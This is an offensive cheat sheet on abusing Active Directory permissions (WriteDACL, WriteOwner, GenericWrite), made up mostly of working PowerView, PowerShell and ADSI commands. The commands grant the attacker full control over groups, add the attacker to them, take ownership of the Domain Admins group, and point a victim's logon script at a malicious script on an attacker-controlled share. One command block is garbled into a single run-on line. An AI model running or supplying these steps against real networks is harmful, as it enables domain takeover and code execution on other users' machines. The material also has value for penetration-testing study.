# Write Property

### <mark style="color:orange;">WriteDACL</mark>

Find domain groups that current user has `WriteDACL` access right to:

```
PowerView3 > Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} | ? {$_.ActiveDirectoryRights -like "*WriteDacl*"}
```

The attacker can take the full control of discovered groups and then add a users to them:

```
PowerView3 > Add-DomainObjectAcl -TargetIdentity "IT Desk" -PrincipalIdentity snovvcrash -Domain tricky.com -Rights All -Verbose
PowerView3 > Add-DomainGroupMember -Identity "IT Desk" -Members snovvcrash -Verbose
```

#### Group membership will take its sweet time to be updated within target user's TGT. To [force](http://woshub.com/how-to-refresh-ad-groups-membership-without-user-logoff/) the update one may purge existing tickets and request new TGT:

```
Cmd > klist purgeCmd > gpupdate /forceCmd > dir \\dc1.megacorp.local\c$
```

### <mark style="color:orange;">WriteOwner on Group</mark>

before the attack the owner of Domain Admins is Domain Admins. After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`

```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:

```
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

### <mark style="color:orange;">GenericWrite on User</mark>

```
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:

```
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

the user's ~~`delegate`~~ logon script field gets updated in the AD.

### <mark style="color:orange;">WriteDACL + WriteOwner</mark>

If you are the owner of a group And you have a `WriteDACL` on that AD object, you can give yourself `GenericAll` privileges with a sprinkle of ADSI sorcery:

```
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Which means you now fully control the AD object.

This effectively means that you can now add new users to the group.

Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:

```
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
